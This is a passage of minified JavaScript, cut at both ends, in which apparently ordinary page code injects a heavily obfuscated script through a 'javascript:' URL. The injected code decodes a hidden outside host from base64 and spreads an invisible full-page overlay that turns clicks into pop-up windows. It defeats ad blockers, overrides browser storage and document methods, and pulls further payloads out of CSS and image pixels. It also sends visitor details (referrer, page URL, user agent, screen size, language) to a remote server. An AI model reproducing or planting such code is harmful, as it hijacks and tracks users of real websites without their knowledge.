                    tb(ht, function(d) {
                        return 0 < a.search(d)
                    })
            }
            return b.D().match(it) ? !0 : null != tb(ht, function(c) {
                return null != a.match(c)
            })
        },
        pt = function(a) {
            if (a && (a = mt(a), !jc(a))) {
                var b = 'javascript:"<body><img src=\\""+' + a + '+"\\"> <script data-cfasync="false" type="text/javascript">(()=>{var K='ChmaorrCfozdgenziMrattShzzyrtarnedpoomrzPteonSitfreidnzgtzcseljibcOezzerlebpalraucgeizfznfoocrzEwaocdhnziaWptpnleytzngoectzzdclriehaCtdenTeepxptaNzoldmetzhRzeegvEoxmpezraztdolbizhXCGtIs=rzicfozn>ceamtazr(fdio/c<u>m"eennto)nz:gyzaclaplslizdl"o=ceallySttso r"akgneazl_bd:attuaozbsae"t=Ictresm zegmeatrIftie<mzzLrMeTmHorveenIntiezmezdcolNeeanrozldcezcdoadeehUzReIdCooNmtpnoenreanptzzebnionndzzybatlopasziedvzaellzyJtSsOzNezmDaartfeizzAtrnreamyuzcPordozmyidsoebzzpeatrasteSIyndtazenrazvtipgiartcoSrtzneenrcroudcezUeRmIazNUgianTty8BAsrtrnaeymzesleEttTeigmzedoIuytBztsneetmIenltEetrevgazlSzNAtrnreamyeBluEfeftearezrcclzetanreTmigmaeroFuttnzecmluecaorDIenttaeerrvcazltznMeevsEshacgteaCphsaindnzelllzABrrootacdeclaesStyCrheaunqnzerloztecnecloedSeyUrReIuCqozmrpeonneetnstizLTtynpeevEErervoormzeErvzernetnzeEtrsrioLrtznIemvaEgdedzaszetsnseimoenlSEteotraaegrec'.split("").reduce((v,g,L)=>L%2?v+g:g+v).split("z");(v=>{let g=[K[0],K[1],K[2],K[3],K[4],K[5],K[6],K[7],K[8],K[9]],L=[K[10],K[11],K[12]],R=document,U,s,c=window,C={};try{try{U=window[K[13]][K[0]](K[14]),U[K[15]][K[16]]=K[17]}catch(a){s=(R[K[10]]?R[K[10]][K[18]]:R[K[12]]||R[K[19]])[K[20]](),s[K[21]]=K[22],U=s[K[23]]}U[K[24]]=()=>{},R[K[9]](K[25])[0][K[26]](U),c=U[K[27]];let _={};_[K[28]]=!1,c[K[29]][K[30]](c[K[31]],K[32],_);let S=c[K[33]][K[34]]()[K[35]](36)[K[36]](2)[K[37]](/^\d+/,K[38]);window[S]=document,g[K[39]](a=>{document[a]=function(){return c[K[13]][a][K[40]](window[K[13]],arguments)}}),L[K[39]](a=>{let h={};h[K[28]]=!1,h[K[41]]=()=>R[a],c[K[29]][K[30]](C,a,h)}),document[K[42]]=function(){let a=new c[K[43]](c[K[44]](K[45])[K[46]](K[47],c[K[44]](K[45])),K[48]);return arguments[0]=arguments[0][K[37]](a,S),c[K[13]][K[42]][K[49]](window[K[13]],arguments[0])};try{window[K[50]]=window[K[50]]}catch(a){let h={};h[K[51]]={},h[K[52]]=(B,ve)=>(h[K[51]][B]=c[K[31]](ve),h[K[51]][B]),h[K[53]]=B=>{if(B in h[K[51]])return h[K[51]][B]},h[K[54]]=B=>(delete h[K[51]][B],!0),h[K[55]]=()=>(h[K[51]]={},!0),delete window[K[50]],window[K[50]]=h}try{window[K[44]]}catch(a){delete window[K[44]],window[K[44]]=c[K[44]]}try{window[K[56]]}catch(a){delete window[K[56]],window[K[56]]=c[K[56]]}try{window[K[43]]}catch(a){delete window[K[43]],window[K[43]]=c[K[43]]}for(key in document)try{C[key]=document[key][K[57]](document)}catch(a){C[key]=document[key]}}catch(_){}let z=_=>{try{return c[_]}catch(S){try{return window[_]}catch(a){return null}}};[K[31],K[44],K[58],K[59],K[60],K[61],K[33],K[62],K[43],K[63],K[63],K[64],K[65],K[66],K[67],K[68],K[69],K[70],K[71],K[72],K[73],K[74],K[56],K[75],K[29],K[76],K[77],K[78],K[79],K[50],K[80]][K[39]](_=>{try{if(!window[_])throw new c[K[78]](K[38])}catch(S){try{let a={};a[K[28]]=!1,a[K[41]]=()=>c[_],c[K[29]][K[30]](window,_,a)}catch(a){}}}),v(z(K[31]),z(K[44]),z(K[58]),z(K[59]),z(K[60]),z(K[61]),z(K[33]),z(K[62]),z(K[43]),z(K[63]),z(K[63]),z(K[64]),z(K[65]),z(K[66]),z(K[67]),z(K[68]),z(K[69]),z(K[70]),z(K[71]),z(K[72]),z(K[73]),z(K[74]),z(K[56]),z(K[75]),z(K[29]),z(K[76]),z(K[77]),z(K[78]),z(K[79]),z(K[50]),z(K[80]),C)})((v,g,L,R,U,s,c,C,z,_,S,a,h,B,ve,N,fe,rt,cn,H,lK,zn,Kt,ft,ue,yK,ut,I,ot,j,an,qt)=>{(function(e,q,i,w){(()=>{function ie(n){let t=n[e.IK]()[e.Aj](e.J);return t>=e.HK&&t<=e.rj?t-e.HK:t>=e.ej&&t<=e.tj?t-e.ej+e.LK:e.J}function bn(n){return n<=e.nK?v[e.Kj](n+e.HK):n<=e.jj?v[e.Kj](n+e.ej-e.LK):e.uK}function Mt(n,t){return n[e.Pk](e.h)[e.NK]((r,f)=>{let u=(t+e.U)*(f+e.U),o=(ie(r)+u)%e.lK;return bn(o)})[e.EK](e.h)}function _e(n,t){return n[e.Pk](e.h)[e.NK]((r,f)=>{let u=t[f%(t[e.SK]-e.U)],o=ie(u),M=ie(r)-o,d=M<e.J?M+e.lK:M;return bn(d)})[e.EK](e.h)}var dt=S,O=dt,it=e.yj(e.rK,e.KK),ct=e.yj(e.jK,e.KK),zt=e.V,at=[[e.kj],[e.Mj,e.bj,e.Ej],[e.Yj,e.Sj],[e.gj,e.Cj,e.Gj],[e.hj,e.vj]],bt=[[e.Oj],[-e.Lj],[-e.Nj],[-e.Fj,-e.qj],[e.Wj,e.Ej,-e.Oj,-e.Rj]],jt=[[e.cj],[e.pj],[e.Bj],[e.Qj],[e.Vj]];function Ce(n,t){try{let r=n[e.FK](f=>f[e.LM](t)>-e.U)[e.vM]();return n[e.LM](r)+zt}catch(r){return e.J}}function mt(n){return it[e.hK](n)?e.i:ct[e.hK](n)?e.V:e.U}function Et(n){return Ce(at,n)}function lt(n){return Ce(bt,n[e.mj]())}function yt(n){return Ce(jt,n)}function pt(n){return n[e.Pk](e.iK)[e.kK](e.U)[e.FK](t=>t)[e.vM]()[e.Pk](e.DK)[e.kK](-e.V)[e.EK](e.DK)[e.eM]()[e.Pk](e.h)[e.sK]((t,r)=>t+ie(r),e.J)%e.w+e.U}var Be=[];function xt(){return Be}function X(n){Be[e.kK](-e.U)[e.oj]()!==n&&Be[e.Hj](n)}var oe=typeof i<e.l?i[e.qr]:e.v,Ne=e.H,Te=e.n,ce=c[e.A]()[e.IK](e.lK)[e.kK](e.V),st=c[e.A]()[e.IK](e.lK)[e.kK](e.V),Fe=c[e.A]()[e.IK](e.lK)[e.kK](e.V),pK=c[e.A]()[e.IK](e.lK)[e.kK](e.V);function jn(n){oe[e.zK](Ne,jn),[mt(w[e.fr]),Et(q[e.uj][e.JK]),lt(new s),pt(q[e.nj][e.xb]),yt(w[e.yb]||w[e.Lb])][e.X](t=>{let r=a(c[e.A]()*e.LK,e.LK);N(()=>{let f=e.MK();f[e.aK]=n[e.XK],f[e.ob]=t,q[e.PK](f,e.fK),X(e.LE[e.CK](t))},r)})}function mn(n){oe[e.zK](Te,mn);let t=e.MK();t[e.aK]=n[e.XK];let{href:r}=q[e.nj],f=new q[e.Tj];f[e.Pj](e.gr,r),f[e.fj]=()=>{t[e.Nr]=f[e.bE](),q[e.PK](t,e.fK)},f[e.Rr]=()=>{t[e.Nr]=e.Fb,q[e.PK](t,e.fK)},f[e.xk]()}oe&&(oe[e.T](Ne,jn),oe[e.T](Te,mn));var ht=e.u,wt=e.z,V=e.a,ze=i[e.qr],T=[q],Jt=[],gt=()=>{};ze&&ze[e.Rr]&&(gt=ze[e.Rr]);try{let n=T[e.kK](-e.U)[e.oj]();for(;n&&n!==n[e.rk]&&n[e.rk][e.uj][e.JK];)T[e.Hj](n[e.rk]),n=n[e.rk]}catch(n){}T[e.X](n=>{n[e.Ub][e.PM][e.NM][e.aM]||(n[e.Ub][e.PM][e.NM][e.aM]=c[e.A]()[e.IK](e.lK)[e.kK](e.V));let t=n[e.Ub][e.PM][e.NM][e.aM];n[t]=n[t]||[];try{n[V]=n[V]||[]}catch(r){}});function Ut(n,t,r,f=e.J,u=e.J,o){let M;try{M=ze[e.Ek][e.Pk](e.iK)[e.V]}catch(d){}try{let d=q[e.Ub][e.PM][e.NM][e.aM]||V,b=q[d][e.FK](l=>l[e.Kk]===r&&l[e.bb])[e.vM](),p=e.MK();p[e.jk]=n,p[e.Mb]=t,p[e.Kk]=r,p[e.bb]=b?b[e.bb]:u,p[e.Eb]=M,p[e.Yb]=f,p[e.Sb]=o,o&&o[e.db]&&(p[e.db]=o[e.db]),Jt[e.Hj](p),T[e.X](l=>{let J=l[e.Ub][e.PM][e.NM][e.aM]||V;l[J][e.Hj](p);try{l[V][e.Hj](p)}catch(E){}})}catch(d){}}function Ae(n,t){let r=Pt();for(let f=e.J;f<r[e.SK];f++)if(r[f][e.Kk]===t&&r[f][e.jk]===n)return!e.J;return!e.U}function Pt(){let n=[];for(let t=e.J;t<T[e.SK];t++){let r=T[t][e.Ub][e.PM][e.NM][e.aM],f=T[t][r]||[];for(let u=e.J;u<f[e.SK];u++)n[e.FK](({format:o,zoneId:M})=>{let d=o===f[u][e.jk],b=M===f[u][e.Kk];return d&&b})[e.SK]>e.J||n[e.Hj](f[u])}try{for(let t=e.J;t<T[e.SK];t++){let r=T[t][V]||[];for(let f=e.J;f<r[e.SK];f++)n[e.FK](({format:u,zoneId:o})=>{let M=u===r[f][e.jk],d=o===r[f][e.Kk];return M&&d})[e.SK]>e.J||n[e.Hj](r[f])}}catch(t){}return n}function En(n,t){T[e.NK](r=>{let f=r[e.Ub][e.PM][e.NM][e.aM]||V;return(r[f]||[])[e.FK](u=>n[e.LM](u[e.Kk])>-e.U)})[e.sK]((r,f)=>r[e.CK](f),[])[e.X](r=>{try{r[e.Sb][e.ek](t)}catch(f){}})}var Y=e.MK();Y[e.U]=e.x,Y[e.d]=e.r,Y[e.Z]=e.K,Y[e.i]=e.j,Y[e.w]=e.k,Y[e.I]=e.M,Y[e.V]=e.b;var W=e.MK();W[e.U]=e.E,W[e.I]=e.Y,W[e.i]=e.S,W[e.V]=e.b;var k=e.MK();k[e.U]=e.g,k[e.V]=e.C,k[e.d]=e.G,k[e.Z]=e.G,k[e.i]=e.G;var m=9352772,F=9352771,xK=360,vt=1,_t=10,Ct=3,sK=true,hK=U[e.bK](g('eyJhZGJsb2NrIjp7fSwiZXhjbHVkZXMiOiIifQ==')),A=1,ln='Ly9tYWR1cmlyZC5jb20vNS85MzUyNzcy',yn='bWFkdXJpcmQuY29t',Bt=2,Nt=1747720258*e.mr,Tt='Zez$#t^*EFng',Ft='4ly',At='7nz05wlebvq',pn='01t5r1u4',xn='z3c',sn='bngja9zmyl6',Lt='_lxtqolz',Xt='_xivfmvdp',Zt=false,x=e.MK(),Dt=e.XM[e.Pk](e.h)[e.zj]()[e.EK](e.h);typeof q<e.l&&(x[e.UK]=q,typeof q[e.uj]<e.l&&(x[e.aj]=q[e.uj])),typeof i<e.l&&(x[e.dK]=i,x[e.ZK]=i[Dt]),typeof w<e.l&&(x[e.or]=w);function hn(){let{doc:n}=x;try{x[e.pK]=n[e.pK]}catch(t){let r=[][e.eb][e.Sk](n[e.qb](e.kk),f=>f[e.Ek]===e.Jj);x[e.pK]=r&&r[e.Zb][e.pK]}}hn(),x[e.s]=()=>{if(!q[e.rk])return e.v;try{let n=q[e.rk][e.Ub],t=n[e.pK](e.zM);return n[e.ib][e.Yk](t),t[e.JM]!==n[e.ib]?!e.U:(t[e.JM][e.gk](t),x[e.UK]=q[e.rk],x[e.dK]=x[e.UK][e.Ub],hn(),!e.J)}catch(n){return!e.U}},x[e.D]=()=>{try{return x[e.dK][e.qr][e.JM]!==x[e.dK][e.ib]?(x[e.Rb]=x[e.dK][e.qr][e.JM],(!x[e.Rb][e.xK][e.iM]||x[e.Rb][e.xK][e.iM]===e.Zk)&&(x[e.Rb][e.xK][e.iM]=e.mb),!e.J):!e.U}catch(n){return!e.U}};var ae=x;function Rt(n,t,r){let f=ae[e.dK][e.pK](e.kk);f[e.xK][e.Mk]=e.Xj,f[e.xK][e.JK]=e.Xj,f[e.xK][e.bk]=e.J,f[e.Ek]=e.Jj,(ae[e.dK][e.BM]||ae[e.ZK])[e.Yk](f);let u=f[e.FM][e.Pj][e.Sk](ae[e.UK],n,t,r);return f[e.JM][e.gk](f),u}var be,Yt=[];function Qt(){let n=[e.Ck,e.Gk,e.hk,e.vk,e.Ok,e.Wk,e.ck,e.pk],t=[e.uK,e.Bk,e.Qk,e.Vk,e.Hk],r=[e.nk,e.uk,e.zk,e.ak,e.Xk,e.Jk,e.Uk,e.dk,e.Zk,e.ik,e.wk,e.Ik],f=c[e.lk](c[e.A]()*n[e.SK]),u=n[f][e.sk](e.yj(e.Ck,e.qM),()=>{let o=c[e.lk](c[e.A]()*r[e.SK]);return r[o]})[e.sk](e.yj(e.Gk,e.qM),()=>{let o=c[e.lk](c[e.A]()*t[e.SK]),M=t[o],d=c[e.EE](e.LK,M[e.SK]),b=c[e.lk](c[e.A]()*d);return e.h[e.CK](M)[e.CK](b)[e.kK](M[e.SK]*-e.U)});return e.Dk[e.CK](be,e.iK)[e.CK](u,e.iK)}function Ht(){return e.h[e.CK](Qt()[e.kK](e.J,-e.U),e.wK)}function Ot(n){return n[e.Pk](e.iK)[e.kK](e.i)[e.EK](e.iK)[e.Pk](e.h)[e.sK]((t,r,f)=>{let u=c[e.EE](f+e.U,e.I);return t+r[e.Aj](e.J)*u},e.Ak)[e.IK](e.lK)}function Vt(){let n=i[e.pK](e.kk);return n[e.xK][e.Mk]=e.Xj,n[e.xK][e.JK]=e.Xj,n[e.xK][e.bk]=e.J,n}function wn(n){n&&(be=n,Gt())}function Gt(){be&&Yt[e.X](n=>n(be))}function St(n){try{let t=i[e.pK](e.cr);t[e.aK]=e.RM,(i[e.BM]||i[e.PM])[e.Yk](t),N(()=>{try{n(getComputedStyle(t,e.v)[e.wE]!==e.XE)}catch(r){n(!e.J)}},e.ok)}catch(t){n(!e.J)}}function It(){let n=Bt===e.U?e.Uj:e.dj,t=e.mM[e.CK](n,e.oM)[e.CK](Y[A]),r=e.MK();r[e.ek]=wn,r[e.tk]=xt,r[e.yk]=sn,r[e.Lk]=pn,r[e.Nk]=xn,Ut(t,ht,m,Nt,F,r)}function Jn(){let n=W[A];return Ae(n,F)||Ae(n,m)}function gn(){let n=W[A];return Ae(n,F)}function Wt(){let n=[e.Fk,e.qk,e.Rk,e.mk],t=i[e.pK](e.kk);t[e.xK][e.bk]=e.J,t[e.xK][e.JK]=e.Xj,t[e.xK][e.Mk]=e.Xj,t[e.Ek]=e.Jj;try{i[e.PM][e.Yk](t),n[e.X](r=>{try{q[r]}catch(f){delete q[r],q[r]=t[e.FM][r]}}),i[e.PM][e.gk](t)}catch(r){}}var Le=e.MK(),je=e.MK(),Xe=e.MK(),$t=e.U,ee=e.h,me=e.h;Ze();function Ze(){if(ee)return;let n=fe(()=>{if(gn()){H(n);return}if(me){try{let t=me[e.Pk](le)[e.FK](M=>!le[e.hK](M)),[r,f,u]=t;me=e.h,Xe[e.o]=f,Le[e.o]=r,je[e.o]=Nn(u,e.Tr),[Le,je,Xe][e.X](M=>{ye(M,st,$t)});let o=[_e(Le[e.t],je[e.t]),_e(Xe[e.t],je[e.t])][e.EK](e.DK);ee!==o&&(ee=o,En([m,F],ee))}catch(t){}H(n)}},e.ok)}function Un(){return ee}function kt(){ee=e.h}function Ee(n){n&&(me=n)}var y=e.MK();y[e.A]=e.h,y[e.e]=e.h,y[e.t]=e.h,y[e.y]=void e.J,y[e.L]=e.v,y[e.N]=_e(Ft,At);var Pn=new s,vn=!e.U;_n();function _n(){y[e.y]=!e.U,Pn=new s;let n=Mr(y,Fe),t=fe(()=>{if(y[e.t]!==e.h){if(H(t),q[e.zK](e.P,n),y[e.t]===e.Fb){y[e.y]=!e.J;return}try{if(C(y[e.e])[e.NE](e.J)[e.X](f=>{y[e.A]=e.h;let u=Cn(e.KY,e.uE);C(u)[e.NE](e.J)[e.X](o=>{y[e.A]+=v[e.Kj](Cn(e.ej,e.tj))})}),gn())return;let r=e.IE*e.Lj*e.mr;N(()=>{if(vn)return;let f=new s()[e.xM]()-Pn[e.xM]();y[e.L]+=f,_n(),Ze(),hr()},r)}catch(r){}y[e.y]=!e.J,y[e.t]=e.h}},e.ok);q[e.T](e.P,n)}function er(){return y[e.t]=y[e.t]*e.UM%e.Tk,y[e.t]}function Cn(n,t){return n+er()%(t-n)}function nr(n){return n[e.Pk](e.h)[e.sK]((t,r)=>(t<<e.Z)-t+r[e.Aj](e.J)&e.Tk,e.J)}function tr(){return[y[e.A],y[e.N]][e.EK](e.DK)}function De(){let n=[...e.dM],t=(c[e.A]()*e.ZM|e.J)+e.d;return[...C(t)][e.NK](r=>n[c[e.A]()*n[e.SK]|e.J])[e.EK](e.h)}function Re(){return y[e.y]}function rr(){vn=!e.J}var le=e.yj(e.YK,e.h),Kr=typeof i<e.l?i[e.qr]:e.v,fr=e.F,ur=e.q,or=e.R,qr=e.m;function ye(n,t,r){let f=n[e.o][e.Pk](le)[e.FK](o=>!le[e.hK](o)),u=e.J;return n[e.t]=f[u],n[e.SK]=f[e.SK],o=>{let M=o&&o[e.tM]&&o[e.tM][e.aK],d=o&&o[e.tM]&&o[e.tM][e.ob];if(M===t)for(;d--;)u+=r,u=u>=f[e.SK]?e.J:u,n[e.t]=f[u]}}function Mr(n,t){return r=>{let f=r&&r[e.tM]&&r[e.tM][e.aK],u=r&&r[e.tM]&&r[e.tM][e.Nr];if(f===t)try{let o=(n[e.L]?new s(n[e.L])[e.IK]():u[e.Pk](fr)[e.eb](p=>p[e.DM](e.FE)))[e.Pk](ur)[e.oj](),M=new s(o)[e.cE]()[e.Pk](or),d=M[e.vM](),b=M[e.vM]()[e.Pk](qr)[e.vM]();n[e.e]=a(b/Ct,e.LK)+e.U,n[e.L]=n[e.L]?n[e.L]:new s(o)[e.xM](),n[e.t]=nr(d+Tt)}catch(o){n[e.t]=e.Fb}}}function Bn(n,t){let r=new ut(t);r[e.XK]=n,Kr[e.fk](r)}function Nn(n,t){return C[e.TM](e.v,e.MK(e.SK,t))[e.NK]((r,f)=>Mt(n,f))[e.EK](e.AK)}var Tn=e.U,Ye=e.MK(),Fn=e.MK(),An=e.MK();Ye[e.o]=pn,q[e.T](e.P,ye(Ye,ce,Tn));var dr=Ye[e.SK]*e.Tr;Fn[e.o]=Nn(sn,dr),An[e.o]=xn,q[e.T](e.P,ye(Fn,ce,e.Tr)),q[e.T](e.P,ye(An,ce,Tn));var Ln=e.f,pe=e.xr,ir=e.W,cr=e.l;function Xn(n){let t=a(n,e.LK)[e.IK](e.lK),r=[Ln,t][e.EK](cr),f=[Ln,t][e.EK](ir);return[r,f]}function zr(n,t){let[r,f]=Xn(n);j[r]=e.J,j[f]=t}function ar(n){let[t,r]=Xn(n),f=a(j[t],e.LK)||e.J,u=j[r];return f>=e.i?(delete j[t],delete j[r],e.v):u?(j[t]=f+e.U,u):e.v}function br(n){let t=new s()[e.xM]();try{j[pe]=e.h[e.CK](t,e.gb)[e.CK](n)}catch(r){}}function jr(){try{if(!j[pe])return e.h;let[n,t]=j[pe][e.Pk](e.gb);return a(n,e.LK)+e.Zj<new s()[e.xM]()?(delete j[pe],e.h):t}catch(n){return e.h}}var mr=e.rr,Er=e.Kr,Qe=e.jr,lr=e.kr,Zn=e.Mr,He=e.br,xe=e.Er,se=e.Yr,Dn=e.Sr,yr=e.gr,pr=e.Cr,xr=e.Gr,Oe=e.hr,Rn=e.vr,he=!e.U;function sr(){return e.eK[e.CK](m,e.tK)}function ne(){return Un()}function hr(){let n=e.MK(),t=fe(()=>{Re()&&(H(t),Ve())},e.ok);n[e.aK]=Fe,q[e.PK](n,e.fK)}function Ve(n){let t=new q[e.Tj];t[e.Pj](yr,e.Dk[e.CK](tr())),n&&t[e.rM](Qe,lr),t[e.rM](xr,k[A]),t[e.fj]=()=>{if(t[e.lb]===e.wb){let r=t[e.bE]()[e.VE]()[e.Pk](e.yj(e.HE,e.h)),f=e.MK();r[e.X](u=>{let o=u[e.Pk](e.oE),M=o[e.vM]()[e.eM](),d=o[e.EK](e.oE);f[M]=d}),f[Oe]?(he=!e.J,Ee(f[Oe]),n&&br(f[Oe])):f[Rn]&&Ee(f[Rn]),n||Ze()}},t[e.Rr]=()=>{n&&(he=!e.J,Ee(e.YE))},kt(),t[e.xk]()}function Yn(n){return new O((t,r)=>{let f=new s()[e.xM](),u=fe(()=>{let o=Un();o?(H(u),o===e.tE&&r(new I(e.tr)),he&&(n||rr(),t(o)),t()):f+e.lE<new s()[e.xM]()&&(H(u),r(new I(e.TE)))},e.ok)})}function wr(){let n=jr();if(n)he=!e.J,Ee(n);else{let t=fe(()=>{Re()&&(H(t),Ve(!e.J))},e.ok)}}var Qn=e.Or,wK=e.gK[e.CK](m,e.GK),Ge=e.Wr,JK=vt*e.Pr,gK=_t*e.mr;q[Ge]||(q[Ge]=e.MK());function Jr(n){try{let t=e.h[e.CK](Qn)[e.CK](n),r=an[t]||j[t];if(r)return new s()[e.xM]()>a(r,e.LK)}catch(t){}return!e.J}function Hn(n){let t=new s()[e.xM]()+e.Zj,r=e.h[e.CK](Qn)[e.CK](n);q[Ge][n]=!e.J;try{j[r]=t}catch(f){}try{an[r]=t}catch(f){}}var Q=w[e.fr],gr=Q[e.yK](e.yj(e.KM,e.h))||[],Ur=Q[e.yK](e.yj(e.jM,e.h))||[],On=a(gr[e.U],e.LK)||a(Ur[e.U],e.LK),we=e.yj(e.ij,e.h)[e.hK](Q),Pr=e.yj(e.rK,e.KK)[e.hK](Q),Vn=we||Pr,vr=e.yj(e.wj,e.h)[e.hK](Q),_r=e.yj(e.Ij,e.lj)[e.hK](Q),Cr=e.yj(e.kM,e.KK)[e.hK](Q)&&e.yj(e.MM,e.KK)[e.hK](Q),P,te,Se=!e.U,Gn=!e.U,Sn=g(yn),Br=[e.vK,e.H,e.OK,e.WK,e.cK];function Nr(n,t){let r=!Cr&&On<e.bM;n[e.T]?(we||(On&&!Vn?n[e.T](e.vK,t,!e.J):(_r||vr)&&!Vn?n[e.T](e.H,t,!e.J):(n[e.T](e.H,t,!e.J),n[e.T](e.OK,t,!e.J))),r?we?n[e.T](e.WK,t,!e.J):n[e.T](e.cK,t,!e.J):we&&n[e.T](e.H,t,!e.J)):i[e.sj]&&n[e.sj](e.E,t)}function Ie(n){!Jr(n)||Gn||(Gn=n===m,P=i[e.pK](e.cr),P[e.xK][e.iM]=e.EM,P[e.xK][e.rk]=e.J,P[e.xK][e.wM]=e.J,P[e.xK][e.IM]=e.J,P[e.xK][e.lM]=e.J,P[e.xK][e.ur]=e.Tk,P[e.xK][e.sM]=e.YM,te=t=>{if(Se)return;t[e.SE](),t[e.gE](),qe();let r=Rt(e.Dk[e.CK](Sn,e.nE)[e.CK](n,e.pE));r&&n===F?Hn(n):r&&n===m&&N(()=>{r[e.sE]||Hn(n)},e.mr)},Nr(P,te),i[e.PM][e.Yk](P),Se=!e.U)}function qe(){try{Br[e.X](n=>{q[e.zK](n,te,!e.J),q[e.zK](n,te,!e.U)}),P&&i[e.PM][e.gk](P),te=void e.J}catch(n){}Se=!e.J}function We(){return te===void e.J}function In(n){Sn=n}var Tr=e.cr,Wn=i[e.pK](Tr),Fr=e.pr,Ar=e.Br,Lr=e.Qr,Xr=e.Vr,Zr=e.Hr,Dr=e.nr;Wn[e.xK][e.ur]=Fr,Wn[e.xK][e.zr]=Ar;function Rr(n){let t=C[e.KE][e.kK][e.Sk](i[e.Tb])[e.FK](r=>r[e.xb]===n)[e.oj]()[e.Dj];return(t[e.J][e.fM][e.DM](e.AM)?t[e.J][e.xK][e.SM]:t[e.V][e.xK][e.SM])[e.kK](e.U,-e.U)}function $e(n){return Kt(g(n)[e.Pk](e.h)[e.NK](function(t){return e.jE+(e.Bk+t[e.Aj](e.J)[e.IK](e.uE))[e.kK](-e.V)})[e.EK](e.h))}function ke(n){let t=g(n),r=new rt(t[e.SK]);return new ve(r)[e.NK]((f,u)=>t[e.Aj](u))}function Yr(n,t){return new O((r,f)=>{let u=i[e.pK](Lr);u[e.xb]=n,u[e.Pb]=Xr,u[e.pM]=Dr,u[e.fb]=Zr,i[e.ib][e.xE](u,i[e.ib][e.kE]),u[e.fj]=()=>{try{let o=Rr(u[e.xb]);u[e.JM][e.gk](u),r(t===xe?ke(o):$e(o))}catch(o){f()}},u[e.Rr]=()=>{u[e.JM][e.gk](u),f()}})}function Qr(n,t){return new O((r,f)=>{let u=new ot;u[e.fb]=e.tb,u[e.Ek]=n,u[e.fj]=()=>{let o=i[e.pK](e.JE);o[e.Mk]=u[e.Mk],o[e.JK]=u[e.JK];let M=o[e.UE](e.dE);M[e.QE](u,e.J,e.J);let{data:d}=M[e.ZE](e.J,e.J,u[e.Mk],u[e.JK]),b=d[e.kK](e.J,e.zE)[e.FK]((E,Z)=>(Z+e.U)%e.d)[e.zj]()[e.sK]((E,Z,Ke)=>E+Z*c[e.EE](e.PE,Ke),e.J),p=[];for(let E=e.zE;E<d[e.SK];E++)if((E+e.U)%e.d){let Z=d[E];(t===xe||Z>=e.qE)&&p[e.Hj](v[e.Kj](Z))}let l=L(p[e.EK](e.h)[e.yE](e.J,b)),J=t===xe?ke(l):$e(l);return r(J)},u[e.Rr]=()=>f()})}function Hr(n,t,r=He,f=se,u=e.MK()){return new O((o,M)=>{let d=new q[e.Tj];if(d[e.Pj](f,n),d[e.nM]=r,d[e.rE]=!e.J,d[e.rM](mr,L(B(t))),d[e.fj]=()=>{let b=e.MK();b[e.lb]=d[e.lb],b[e.Nr]=r===He?U[e.BE](d[e.Nr]):d[e.Nr],[e.wb,e.RE][e.LM](d[e.lb])>=e.J?o(b):M(new I(e.rY[e.CK](d[e.lb],e.oM)[e.CK](d[e.fE],e.mE)[e.CK](t)))},d[e.Rr]=()=>{M(new I(e.rY[e.CK](d[e.lb],e.oM)[e.CK](d[e.fE],e.mE)[e.CK](t)))},f===Dn){let b=typeof u==e.GE?U[e.BE](u):u;d[e.rM](Qe,Zn),d[e.xk](b)}else d[e.xk]()})}function Or(n,t,r=He,f=se,u=e.MK()){return new O((o,M)=>{let d=Ot(n),b=Vt(),p=!e.U,l,J,E=()=>{try{b[e.JM][e.gk](b),q[e.zK](e.P,Z),p||M(new I(e.xY))}catch(Ke){}};function Z(Ke){let de=ue[e.rb](Ke[e.tM])[e.oj]();if(de===d)if(cn(J),Ke[e.tM][de]===e.v){let D=e.MK();D[de]=e.MK(e.DE,e.AE,e.cM,L(B(t)),e.QM,f,e.BM,typeof u==e.GE?U[e.BE](u):u),f===Dn&&(D[de][e.eE]=U[e.BE](e.MK(e.jr,Zn))),b[e.FM][e.PK](D,e.fK)}else{p=!e.J,E(),cn(l);let D=e.MK(),dn=U[e.bK](g(Ke[e.tM][de]));D[e.lb]=dn[e.iE],D[e.Nr]=r===xe?ke(dn[e.BM]):$e(dn[e.BM]),[e.wb,e.RE][e.LM](D[e.lb])>=e.J?o(D):M(new I(e.rY[e.CK](D[e.lb],e.mE)[e.CK](t)))}}q[e.T](e.P,Z),b[e.Ek]=n,(i[e.BM]||i[e.PM])[e.Yk](b),J=N(E,e.ME),l=N(E,e.Fr)})}function Je(n){try{return n[e.Pk](e.iK)[e.V][e.Pk](e.DK)[e.kK](-e.V)[e.EK](e.DK)[e.eM]()}catch(t){return e.h}}var Me=e.ar,Vr=e.Xr,Gr=e.O,Sr=e.l,Ir=e.Jr,G=e.MK();G[e.Ur]=e.O,G[e.dr]=e.W,G[e.Zr]=e.c,G[e.ir]=e.p,G[e.wr]=e.B,G[e.Ir]=e.Q;function $n(n,t){let r=G[t]||Sr,f=a(n,e.LK)[e.IK](e.lK),u=[Me,f][e.EK](r),o=[Me,f,Vr][e.EK](r),M=[Me,f,Gr][e.EK](r);return[u,o,M]}function Wr(){let n=j[Me];if(n)return n;let t=c[e.A]()[e.IK](e.lK)[e.kK](e.V);return j[Me]=t,t}function $r(n){let t=e.gM[e.CK](ne(),e.CM),r=ue[e.rb](n)[e.NK](u=>{let o=ft(n[u]);return[u,o][e.EK](e.CE)})[e.EK](e.GM),f=new q[e.Tj];f[e.Pj](e.Sr,t,!e.J),f[e.rM](Qe,pr),f[e.xk](r)}function ge(n,t){let[r,f,u]=$n(n,t),o=a(j[u],e.LK)||e.J;j[u]=o+e.U,j[r]=new s()[e.xM](),j[f]=e.h}function Ue(n,t,r){let[f,u,o]=$n(n,t);if(j[f]&&!j[u]){let M=a(j[o],e.LK)||e.J,d=a(j[f],e.LK),b=new s()[e.xM](),p=b-d,{referrer:l}=i,J=q[e.nj][e.xb];j[u]=b,j[o]=e.J;let E=e.MK(e.Cb,n,e.Gb,l,e.hb,p,e.vb,r,e.Ob,b,e.Wb,Wr(),e.cb,J,e.pb,d,e.Bb,M,e.Qb,w[e.fr],e.Vb,q[e.uj][e.Mk],e.Hb,q[e.uj][e.JK],e.QM,t||Ir,e.nb,new s()[e.mj](),e.ub,Je(r),e.zb,Je(l),e.ab,Je(J),e.Xb,w[e.yb]||w[e.Lb]);$r(E)}}var kr=e.yj(e.BK,e.KK),eK=e.yj(e.QK),nK=e.yj(e.VK),tK=e.lr,kn=[tK,m[e.IK](e.lK)][e.EK](e.h),re=e.MK();re[e.W]=oK,re[e.B]=qK,re[e.Q]=nn,re[e.Xr]=et;var rK=[nn,et];function KK(n){return 